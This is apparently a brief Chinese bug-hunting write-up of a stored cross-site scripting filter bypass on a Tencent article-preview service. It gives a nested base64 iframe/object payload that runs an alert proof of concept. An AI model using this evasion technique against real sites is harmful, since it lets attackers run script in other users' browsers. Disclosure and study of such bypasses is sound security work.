---
title: bypass-xss
slug: 0003
---
# bypass-xss

**手机端测试发送，web端应该也是一样的**

**就用app端复现吧**

**先正常注册**



**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965692964-0c195112-0207-4a19-8ceb-bdf19cd82ffb.png)**

**写一篇文章，直接发布抓包**

**我们将content参数内容替换成我们绕waf的poc**

<iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDQ9Pjwvb2JqZWN0Pg=="></iframe>

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965693499-1a6cb9e4-bf7a-4a86-805d-ae68b25abf85.png)**

**url: [https://xxxxxxxx.qq.com/spread/previewArticle?articleId=8fAhfdFYUlc%3D](https://teamvision.qq.com/spread/previewArticle?articleId=8fAhfdFYUlc%3D)**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965691623-48716d1e-5ac3-4be8-bac2-445f87211222.png)**

**绕过思路：**

**通过bypass+bypass绕过**

**也就是对object进行base64输出**

**<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgneXVlcWl1Jyk8L3NjcmlwdD4=></object>然后在吧Object标签转换成base64放到iframe进行base64输出**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779965691678-9da2f907-f20f-49a6-898f-c7b84626d591.png)**